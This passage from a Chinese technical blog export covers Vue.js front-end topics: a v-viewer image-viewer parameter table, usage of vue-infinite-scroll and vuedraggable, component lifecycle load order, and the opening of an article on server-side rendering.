<h3 id="使用"><a href="#使用" class="headerlink" title="-使用"></a>-使用</h3><ul>
<li>通过viewer标签包住一个图片列表就能实现<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">viewer</span> <span class="attr">:class</span>=<span class="string">"$style.loadData"</span> <span class="attr">id</span>=<span class="string">"img"</span> <span class="attr">:images</span>=<span class="string">"src1"</span> @<span class="attr">inited</span>=<span class="string">"inited"</span> <span class="attr">ref</span>=<span class="string">"viewer"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(item, index) in src1"</span> <span class="attr">:key</span>=<span class="string">"index+10"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"require('./assets/images/'+item)"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"img"</span> &gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">viewer</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="展示"><a href="#展示" class="headerlink" title="-展示"></a>-展示</h3><p><img src="/images/view.png" alt="My Pic"></p>
<h3 id="参数列表"><a href="#参数列表" class="headerlink" title="-参数列表"></a>-参数列表</h3><table><br><thead><tr><th align="left">参数名称</th><th align="left">参数类型</th><th align="left">默认值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">initialViewIndex</td><td align="left">Number</td><td align="left">0</td><td align="left">定义用于查看的图像的初始索引</td></tr><tr><td align="left">inline</td><td align="left">Boolean</td><td align="left">false</td><td align="left">支持 inline mode</td></tr><tr><td align="left">button</td><td align="left">Boolean</td><td align="left">true</td><td align="left">是否显示查看图片时右上角的关闭按钮</td></tr><tr><td align="left">navbar</td><td align="left">Boolean / Number</td><td align="left">true</td><td align="left">是否显示底部导航栏 <br><code>0</code> 或者 <code>false</code> :不显示 <br><code>1</code> 或者 <code>true</code> :显示 <br><code> 2 </code>:当屏幕宽度大于768px时显示 <br><code>3 </code>:当屏幕宽度大于992px时显示 <br><code>4 </code>:当屏幕宽度大于1200px时显示</td></tr><tr><td align="left">title</td><td align="left">Boolean / Number /<br> Function / Array</td><td align="left">true</td><td align="left"><code> 0 </code> 或者 <code>false</code> 时不显示<br><code>1</code>或者<code>true</code>或者<code>function</code>或者<code>array</code>时显示<br><code>2 </code>:当屏幕宽度大于768px时显示 <br><code>3 </code>:当屏幕宽度大于992px时显示 <br><code>4 </code>:当屏幕宽度大于1200px时显示<br><code>function</code> 在函数体内返回标题<br><code>array</code> 第一个参数表示可见性(0-4) 第二个参数就是标题</td></tr><tr><td align="left">toolbar</td><td align="left">Boolean / Number / Object</td><td align="left">true</td><td align="left">标题栏是否显示和布局 <br><code> 0 </code> 或者 <code>false</code> 时不显示<br><code>1</code>或者<code>true</code>或者时显示<br><code> 2 </code>:当屏幕宽度大于768px时显示 <br><code>3 </code>:当屏幕宽度大于992px时显示 <br><code>4 </code>:当屏幕宽度大于1200px时显示 <br><code>Object</code> : <a href="#articleHeader2">Object类型详解</a></td></tr><tr><td align="left">tooltip</td><td align="left">Boolean</td><td align="left">true</td><td align="left">放大或缩小时显示的百分比的文字提示<br><code>true</code> : 显示 <br><code>false</code> : 不显示</td></tr><tr><td align="left">movable</td><td align="left">Boolean</td><td align="left">true</td><td align="left">是否可以拖动图片</td></tr><tr><td align="left">zoomable</td><td align="left">Boolean</td><td align="left">true</td><td align="left">是否可以缩放图片</td></tr><tr><td align="left">rotatable</td><td align="left">Boolean</td><td align="left">true</td><td align="left">是否可以旋转图片</td></tr><tr><td align="left">scalable</td><td align="left">Boolean</td><td align="left">true</td><td align="left">是否可以缩放图片</td></tr><tr><td align="left">transition</td><td align="left">Boolean</td><td align="left">true</td><td align="left">为一些特殊元素启用CSS3转换。</td></tr><tr><td align="left">fullscreen</td><td align="left">Boolean</td><td align="left">true</td><td align="left">允许全屏播放</td></tr><tr><td align="left">keyboard</td><td align="left">Boolean</td><td align="left">true</td><td align="left">启用键盘支持&lt;/td</td></tr><tr><td align="left">backdrop</td><td align="left">Boolean / String</td><td align="left">true</td><td align="left">启用 modal 为false的时候不支持点击背景关闭</td></tr><tr><td align="left">loading</td><td align="left">Boolean</td><td align="left">true</td><td align="left">加载图片的时候的loading图标</td></tr><tr><td align="left">loop</td><td align="left">Boolean</td><td align="left">true</td><td align="left">是否可以循环查看图片</td></tr><tr><td align="left">interval</td><td align="left">Number</td><td align="left">5000</td><td align="left">定义图片查看器的最小的宽度</td></tr><tr><td align="left">minWidth</td><td align="left">Number</td><td align="left">200</td><td align="left">定义图片查看器的最小的高度</td></tr><tr><td align="left">minHeight</td><td align="left">Number</td><td align="left">100</td><td align="left">播放图片时  距离下一张图片的间隔时间</td></tr><tr><td align="left">zoomRatio</td><td align="left">Number</td><td align="left">0.1</td><td align="left">利用鼠标滚轮缩放图片时的比例</td></tr><tr><td align="left">minZoomRatio</td><td align="left">Number</td><td align="left">0.01</td><td align="left">缩小图片的最小比例</td></tr><tr><td align="left">maxZoomRatio</td><td align="left">Number</td><td align="left">100</td><td align="left">放大图片的放大比例</td></tr><tr><td align="left">zIndex</td><td align="left">Number</td><td align="left">2015</td><td align="left">定义查看器的CSS z-index值 modal 模式下</td></tr><tr><td align="left">zIndexInline</td><td align="left">Number</td><td align="left">0</td><td align="left">定义查看器的CSS z-index值 inline 模式下</td></tr><tr><td align="left">url</td><td align="left">String / Function</td><td align="left">src</td><td align="left">原始图像URL<br>如果是一个字符串，应该图像元素的属性之一<br>如果是一个函数，应该返回一个有效的图像URL</td></tr><tr><td align="left">container</td><td align="left">Element / String</td><td align="left">body</td><td align="left">将查看器置于modal模式的容器 <br> 只有在 inline为 false的时候才可以使用</td></tr><tr><td align="left">filter</td><td align="left">Function</td><td align="left">null</td><td align="left">过滤图像以便查看(如果图像是可见的，应该返回true)</td></tr><tr><td align="left">toggleOnDblclick</td><td align="left">Boolean</td><td align="left">true</td><td align="left">当你放大或者缩小图片时 双击还原</td></tr><tr><td align="left">ready</td><td align="left">Function</td><td align="left">null</td><td align="left">当查看图片时被触发的函数  只会触发一次</td></tr><tr><td align="left">show</td><td align="left">Function</td><td align="left">null</td><td align="left">当查看图片时被触发的函数 每次查看都会触发</td></tr><tr><td align="left">shown</td><td align="left">Function</td><td align="left">null</td><td align="left">当查看图片时被触发的函数 每次查看都会触发 在show之后</td></tr><tr><td align="left">hide</td><td align="left">Function</td><td align="left">null</td><td align="left">当关闭图片查看器时被触发的函数 每次关闭都会触发</td></tr><tr><td align="left">hidden</td><td align="left">Function</td><td align="left">null</td><td align="left">当关闭图片查看器时被触发的函数 每次关闭都会触发 在hide之后</td></tr><tr><td align="left">view</td><td align="left">Function</td><td align="left">null</td><td align="left">当查看图片时被触发的函数 每次查看都会触发 在shown之后</td></tr><tr><td align="left">viewed</td><td align="left">Function</td><td align="left">null</td><td align="left">当查看图片时被触发的函数 每次查看都会触发 在view之后</td></tr><tr><td align="left">zoom</td><td align="left">Function</td><td align="left">null</td><td align="left">在图片缩放时触发</td></tr><tr><td align="left">zoomed</td><td align="left">Function</td><td align="left">null</td><td align="left">在图片缩放时触发 在 zoom之后</td></tr></tbody></table>

<blockquote>
<p>toolbar Object详解<br>key值列表: “zoomIn”, “zoomOut”, “oneToOne”, “reset”, “prev”, “play”, “next”, “rotateLeft”, “rotateRight”, “flipHorizontal”, “flipVertical”</p>
</blockquote>
<table><thead><tr><th align="left">key值名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">zoomIn</td><td align="left">放大图片的按钮</td></tr><tr><td align="left">zoomOut</td><td align="left">缩小图片的按钮</td></tr><tr><td align="left">reset</td><td align="left">重置图片大小的按钮</td></tr><tr><td align="left">prev</td><td align="left">查看上一张图片的按钮</td></tr><tr><td align="left">next</td><td align="left">查看上一张图片的按钮</td></tr><tr><td align="left">play</td><td align="left">播放图片的按钮</td></tr><tr><td align="left">rotateLeft</td><td align="left">向左旋转图片的按钮</td></tr><tr><td align="left">rotateRight</td><td align="left">向右旋转图片的按钮</td></tr><tr><td align="left">flipHorizontal</td><td align="left">图片左右翻转的按钮</td></tr><tr><td align="left">flipVertical</td><td align="left">图片上下翻转的按钮</td></tr></tbody></table>

<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="-参考连接"></a>-参考连接</h3><ul>
<li><a href="https://github.com/fengyuanchen/viewerjs&quot;%3Ehttps://github.com/fengyuanchen/viewerjs" target="_blank" rel="noopener">viewjs github</a></li>
<li><a href="https://mirari.cc/2017/08/27/Vue%E5%9B%BE%E7%89%87%E6%B5%8F%E8%A7%88%E7%BB%84%E4%BB%B6v-viewer%EF%BC%8C%E6%94%AF%E6%8C%81%E6%97%8B%E8%BD%AC%E3%80%81%E7%BC%A9%E6%94%BE%E3%80%81%E7%BF%BB%E8%BD%AC%E7%AD%89%E6%93%8D%E4%BD%9C/&quot;%3Ehttps://mirari.cc/2017/08/27/Vue%E5%9B%BE%E7%89%87%E6%B5%8F%E8%A7%88%E7%BB%84%E4%BB%B6v-viewer%EF%BC%8C%E6%94%AF%E6%8C%81%E6%97%8B%E8%BD%AC%E3%80%81%E7%BC%A9%E6%94%BE%E3%80%81%E7%BF%BB%E8%BD%AC%E7%AD%89%E6%93%8D%E4%BD%9C/%3C/a%3E" target="_blank" rel="noopener">v-view文档</a></li>
<li><a href="https://fengyuanchen.github.io/viewerjs/&quot;%3Ehttps://fengyuanchen.github.io/viewerjs/%3C/a%3E" target="_blank" rel="noopener">viewjs demo</a></li>
</ul>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue中使用无限滚动插件和拖动插件</title>
    <url>/2019/07/28/Vue%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%97%A0%E9%99%90%E6%BB%9A%E5%8A%A8%E6%8F%92%E4%BB%B6%E5%92%8C%E6%8B%96%E5%8A%A8%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;项目中也用到了无限滚动和列表拖拽的需求。无限滚动本来自己写了一个demo，但是使用起来效果不是很好。最后在网上找了一下，最后选择了vue-infinite-scroll，效果还是不错的。除此之外，还有列表拖动的需求，也找了一下，最终选择了vuedraggable，可选的配置参数比较多，我们自己的操作性比较大。下面就介绍一下这两个插件在vue中的使用：<br><a id="more"></a></p>
<h3 id="vue-infinite-scroll"><a href="#vue-infinite-scroll" class="headerlink" title="vue-infinite-scroll"></a>vue-infinite-scroll</h3><h4 id="安装"><a href="#安装" class="headerlink" title="-安装"></a>-安装</h4><hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install vue-infinite-scroll --save</span><br></pre></td></tr></table></figure>
<h4 id="使用"><a href="#使用" class="headerlink" title="-使用"></a>-使用</h4><hr>
<ul>
<li>在main.js中引入插件，再通过Vue.use()来引用,之后就能直接在代码中使用该组件了</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> infiniteScroll <span class="keyword">from</span> <span class="string">'vue-infinite-scroll'</span></span><br><span class="line">Vue.use(infiniteScroll)</span><br></pre></td></tr></table></figure>
<ul>
<li>在组件中的使用</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-infinite-scroll</span>=<span class="string">"loadMore"</span> <span class="attr">infinite-scroll-disabled</span>=<span class="string">"busy"</span> <span class="attr">infinite-scroll-distance</span>=<span class="string">"10"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"item in data"</span> <span class="attr">:key</span>=<span class="string">"item.index"</span>&gt;</span>&#123;&#123;item.name&#125;&#125;            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">    loadMore: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.busy = <span class="literal">true</span></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = <span class="number">10</span>; i &lt; j; i++) &#123;</span><br><span class="line">          <span class="keyword">this</span>.data.push(&#123;<span class="attr">name</span>: <span class="keyword">this</span>.count++ &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.data)</span><br><span class="line">        <span class="keyword">this</span>.busy = <span class="literal">false</span></span><br><span class="line">      &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="选项参数"><a href="#选项参数" class="headerlink" title="-选项参数"></a>-选项参数</h4><hr>
<blockquote>
<p>v-infinite-scroll=”loadMore”表示回调函数是loadMoreinfinite-scroll-disabled=”busy”表示由变量busy决定是否执行loadMore，false则执行loadMore，true则不执行。<br>infinite-scroll-distance=”10”这里10决定了页面滚动到离页尾多少像素的时候触发回调函数，10是像素值。通常我们会在页尾做一个几十像素高的“正在加载中…”，这样的话，可以把这个div的高度设为infinite-scroll-distance的值即可。<br>其他选项：infinite-scroll-immediate-check 默认值为true，该指令意思是，应该在绑定后立即检查busy的值和是否滚动到底。如果你的初始内容高度不够高、不足以填满可滚动的容器的话，你应设为true，这样会立即执行一次loadMore，会帮你填充一些初始内容。<br>infinite-scroll-listen-for-event 当事件在Vue实例中发出时，无限滚动将再次检查。<br>infinite-scroll-throttle-delay 检查busy的值的时间间隔，默认值是200，因为vue-infinite-scroll的基础原理就是，vue-infinite-scroll会循环检查busy的值，以及是否滚动到底，只有当：busy为false且滚动到底，回调函数才会执行。</p>
</blockquote>
<h4 id="相关链接"><a href="#相关链接" class="headerlink" title="-相关链接"></a>-相关链接</h4><ul>
<li><a href="https://github.com/ElemeFE/vue-infinite-scroll&quot;%3Ehttps://github.com/ElemeFE/vue-infinite-scroll%3C/a%3E" target="_blank" rel="noopener">github</a></li>
</ul>
<h3 id="vuedraggable"><a href="#vuedraggable" class="headerlink" title="vuedraggable"></a>vuedraggable</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="- 安装"></a>- 安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install vue-draggable --save</span><br></pre></td></tr></table></figure>
<h4 id="使用-1"><a href="#使用-1" class="headerlink" title="- 使用"></a>- 使用</h4><ul>
<li>在需要用到的页面中直接引入就ok了</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> draggable <span class="keyword">from</span> <span class="string">'vuedraggable'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    components: &#123;</span><br><span class="line">        draggable</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">draggable</span> <span class="attr">:options</span>=<span class="string">"&#123;group:'people',animation:150,ghostClass:'sortable-ghost',chosenClass:'chosenClass',scroll:true,scrollSensitivity:200&#125;"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-model</span>=<span class="string">"list2"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">change</span>=<span class="string">"change"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">start</span>=<span class="string">"start"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">end</span>=<span class="string">"end"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:move</span>=<span class="string">"move"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">"display: inline-block; width:190px;height: 200px;background: #eee;overflow: auto"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item, index) in list2"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">:class</span>=<span class="string">"setclass(item,index)"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">:key</span>=<span class="string">"index"</span>&gt;</span></span><br><span class="line">        &#123;&#123;item.name&#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">draggable</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="事件"><a href="#事件" class="headerlink" title="-事件"></a>-事件</h4><hr>
<ul>
<li>常用的有以下几种<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start, add, remove, update, end, choose, sort, filter, clone</span><br><span class="line"></span><br><span class="line">参数带有如下属性：</span><br><span class="line"></span><br><span class="line">add: 包含被添加到列表的元素 </span><br><span class="line">        newIndex: 添加后的新索引</span><br><span class="line">        element: 被添加的元素</span><br><span class="line">removed: 从列表中移除的元素 </span><br><span class="line">        oldIndex: 移除前的索引</span><br><span class="line">        element: 被移除的元素</span><br><span class="line">moved：内部移动的 </span><br><span class="line">        newIndex: 改变后的索引</span><br><span class="line">        oldIndex: 改变前的索引</span><br><span class="line">        element: 被移动的元素</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//evt里面有两个值，一个evt.added 和evt.removed  可以分别知道移动元素的ID和删除元素的ID</span></span><br><span class="line">    change: <span class="function"><span class="keyword">function</span> (<span class="params">evt</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(evt)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//start ,end ,add,update, sort, remove 得到的都差不多</span></span><br><span class="line">    start: <span class="function"><span class="keyword">function</span> (<span class="params">evt</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(evt)</span><br><span class="line">    &#125;,</span><br><span class="line">    end: <span class="function"><span class="keyword">function</span> (<span class="params">evt</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(evt)</span><br><span class="line">      evt.item <span class="comment">//可以知道拖动的本身</span></span><br><span class="line">      evt.to    <span class="comment">// 可以知道拖动的目标列表</span></span><br><span class="line">      evt.from  <span class="comment">// 可以知道之前的列表</span></span><br><span class="line">      evt.oldIndex  <span class="comment">// 可以知道拖动前的位置</span></span><br><span class="line">      evt.newIndex  <span class="comment">// 可以知道拖动后的位置</span></span><br><span class="line">    &#125;,</span><br><span class="line">    move: <span class="function"><span class="keyword">function</span> (<span class="params">evt, originalEvent</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(evt)</span><br><span class="line">      <span class="built_in">console</span>.log(originalEvent) <span class="comment">//鼠标位置</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="参数列表"><a href="#参数列表" class="headerlink" title="-参数列表"></a>-参数列表</h4><ul>
<li>由于vuedraggable是基于sortJS的，所以参数配置基本上一样</li>
</ul>
<blockquote>
<p>group: string or array 分组用的，同一组的不同list可以相互拖动<br>sort: boolean 定义是否可以拖拽<br>delay:number 定义鼠标选中列表单元可以开始拖动的延迟时间<br>touchStartThreshold:number px,在取消延迟拖动事件之前，点应该移动多少像素<br>disabled: boolean 定义是否此sortable对象是否可用，为true时&gt;sortable对象不能拖放排序等功能<br>store: null,<br>animation: umber 单位:ms 动画时间<br>handle: selector 格式为简单css选择器的字符串，使列表单元中符合选择器的元素成为拖动的手柄，只有按住拖动手柄才能使列表单元进行拖动<br>filter: selector 格式为简单css选择器的字符串，定义哪些列表单元不能进行拖放，可设置为多个选择器，中间用“，”分隔<br>preventOnFilter: 当拖动filter时是否触发event.preventDefault()默认触发<br>draggable: selector 格式为简单css选择器的字符串，定义哪些列表单元可以进行拖放<br>ghostClass: selector 格式为简单css选择器的字符串，当拖动列表单元时会生成一个副本作为影子单元来模拟被拖动单元排序的情况，此配置项就是来给这个影子单元添加一个class，我们可以通过这种方式来给影子元素进行编辑样式<br>chosenClass: selector 格式为简单css选择器的字符串，目标被选中时添加<br>dragClass:selector 格式为简单css选择器的字符串，目标拖动过程中添加<br>forceFallback: boolean 如果设置为true时，将不使用原生的html5的拖放，可以修改一些拖放中元素的样式等<br>fallbackClass： string 当forceFallback设置为true时，拖放过程中鼠标附着单元的样式<br>dataIdAttr： data-id<br>scroll：boolean当排序的容器是个可滚动的区域，拖放可以引起区域滚动<br>scrollFn：function(offsetX, offsetY, originalEvent, touchEvt, &gt;hoverTargetEl) { … } 用于自定义滚动条的适配<br>scrollSensitivity: number 就是鼠标靠近边缘多远开始滚动默认30<br>scrollSpeed: number 滚动速度</p>
</blockquote>
<ul>
<li>官方建议参数配置项不写在options里，而是如下所示<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">draggable</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-model</span>=<span class="string">"list"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">handle</span>=<span class="string">".handle"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:group</span>=<span class="string">"&#123; name: 'people', pull: 'clone', put: false &#125;"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">ghost-class</span>=<span class="string">"ghost"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:sort</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">change</span>=<span class="string">"log"</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">draggable</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="-相关链接"></a>-相关链接</h4><ul>
<li><a href="https://github.com/SortableJS/Vue.Draggable&quot;%3Ehttps://github.com/SortableJS/Vue.Draggable" target="_blank" rel="noopener">vuedraggable github</a></li>
<li><a href="https://github.com/SortableJS/Sortable&quot;%3Ehttps://github.com/SortableJS/Sortable" target="_blank" rel="noopener">sortJs github</a></li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue中的加载顺序</title>
    <url>/2019/06/10/Vue%E4%B8%AD%E7%9A%84%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;今天评审的时候，自己才学到了一个新的知识关于Vue的加载顺序。才知道自己之前的某些bug产生的原因呜呜呜呜。然后自己下来也去验证了一下果然是这样的。<br><a id="more"></a></p>
<h3 id="1-vue的生命周期"><a href="#1-vue的生命周期" class="headerlink" title="1.vue的生命周期"></a>1.vue的生命周期</h3><p>众所周知vue的生命周期包括beforeCreate、created、beforeMount、mounted、beforeUpdate、update、beforeDestory、destoryed以及后面为keep-alive加上的activated、deactivated。执行顺序也都清楚：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beforeCreate-&gt;created-&gt;beforeMount-&gt;mounted-&gt;beforeDestory-&gt;destoryed</span><br></pre></td></tr></table></figure></p>
<ul>
<li>具体每个阶段所做的事，大家也可以去自行查找一下，也挺重要的。由于不是这篇的重点于是就略过啦。</li>
</ul>
<h3 id="2-app-vue与view-router的加载顺序"><a href="#2-app-vue与view-router的加载顺序" class="headerlink" title="2.app.vue与view-router的加载顺序"></a>2.app.vue与view-router的加载顺序</h3><p>之前自己的认识是app.vue中加载完成之后才到之后的部分<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//app.vue</span></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">&lt;router-link to=<span class="string">"/"</span>&gt;home&lt;<span class="regexp">/router-link&gt;&lt;router-link to="/</span>regis<span class="string">"&gt;regis&lt;/router-link&gt;&lt;router-link to="</span>/about<span class="string">"&gt;about&lt;/router-link&gt;</span></span><br><span class="line"><span class="string">&lt;!-- &lt;backtop v-if="</span>show<span class="string">"&gt;&lt;/backtop&gt; --&gt;</span></span><br><span class="line"><span class="string">&lt;router-view/&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">beforeCreate()&#123;</span></span><br><span class="line"><span class="string">  console.log('app beforeCreate')</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">created () &#123;</span></span><br><span class="line"><span class="string">  console.log('app create')</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">beforeMount () &#123;</span></span><br><span class="line"><span class="string">  console.log('app beforeMount')</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">mounted () &#123;</span></span><br><span class="line"><span class="string">  console.log('app mounted')</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//router-view</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">beforeCreate()&#123;</span></span><br><span class="line"><span class="string">  console.log('/ beforeCreate')</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">created () &#123;</span></span><br><span class="line"><span class="string">  console.log('/ create')</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">beforeMount () &#123;</span></span><br><span class="line"><span class="string">  console.log('/ beforeMount')</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">mounted () &#123;</span></span><br><span class="line"><span class="string">  console.log('/ mounted')</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//最终打印结果是：app beforeCreate -&gt; app create -&gt; app beforeMount -&gt; /  beforeCreate -&gt; / create -&gt; / beforeMount -&gt; / mounted -&gt; app mounted</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>app.vue中的mounted要等到子组件和router-view中的内容都加载完成之后再执行</li>
</ul>
<h3 id="3-组件与router-view"><a href="#3-组件与router-view" class="headerlink" title="3. 组件与router-view"></a>3. 组件与router-view</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码顺序</span></span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">&lt;router-link to=<span class="string">"/"</span>&gt;home&lt;<span class="regexp">/router-link&gt;&lt;router-link to="/</span>regis<span class="string">"&gt;regis&lt;/router-link&gt;&lt;router-link to="</span>/about<span class="string">"&gt;about&lt;/router-link&gt;</span></span><br><span class="line"><span class="string">&lt;backtop&gt;&lt;/backtop&gt;</span></span><br><span class="line"><span class="string">&lt;router-view/&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string">//执行结果：backtop beforeMount -&gt; backtop create -&gt; backtop beforeMount  -&gt; / beforeCreate -&gt; / create -&gt; / beforeMount -&gt; backtop mounted -&gt; / mounted</span></span><br></pre></td></tr></table></figure>
<ul>
<li>交换位置之后二者的执行顺序也反了过来，组件与组件之间的加载顺序也与之类似</li>
</ul>
<p>总结一下其实就是这样：<br>父组件beforeCreated -&gt;父组件created -&gt;父组件beforeMounted -&gt;子组件beforeCreated -&gt;子组件created -&gt;子组件beforeMounted -&gt;子组件mounted -&gt; 父组件mounted</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue中服务端渲染</title>
    <url>/2019/08/24/Vue%E4%B8%AD%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近用vue做的一个项目中，有服务端渲染的需求，然后自己就去看了这方面的一些资料、官方文档、实现方法等。实现方法主要有预渲染（代替服务端渲染只需求部分页面且主要是静态的）、nuxt（服务端渲染框架适合从头开始写的项目）、自己搭建ssr等。下面就主要讲的是通过官网的方式自己搭建服务端渲染：<br><a id="more"></a></p>
<h3 id="什么是SSR"><a href="#什么是SSR" class="headerlink" title="什么是SSR"></a>什么是SSR</h3><blockquote>
<p>服务端渲染直译就是我们的页面及数据都是在服务端写好之后，再直接返回内容给我们。我们可以查看使用vue或react开发的页面的源码，会发现只有一个app而没有数据，因为数据都是通过js加上的。而服务端渲染之后的网页源码中会有数据。或者通过network中也可以查看不同。<br><img src="/images/ssr1.png" alt="My Pic"><br><img src="/images/ssr2.png" alt="My Pic"></p>
</blockquote>
<h3 id="为什么要使用SSR"><a href="#为什么要使用SSR" class="headerlink" title="为什么要使用SSR"></a>为什么要使用SSR</h3><blockquote>
<p>类似于像vue、react这类框架开发的spa应用，首屏的时候，因为他要等待资源加载完成，然后再进行渲染，会导致了首屏有白屏，如果是单个页面还好，如果是spa应用 那么 他的加载时间就会变得很长，白屏时间会很影响用户体验，再有就是由于国内的搜索公司 对于spa 应用没有很好的兼容，导致了客户端渲染会对seo非常的不友好，有seo 需求的页面就很迫切的需要服务端渲染。</p>
</blockquote>
<h3 id="缺点相对于（SPA）"><a href="#缺点相对于（SPA）" class="headerlink" title="缺点相对于（SPA）"></a>缺点相对于（SPA）</h3><blockquote>
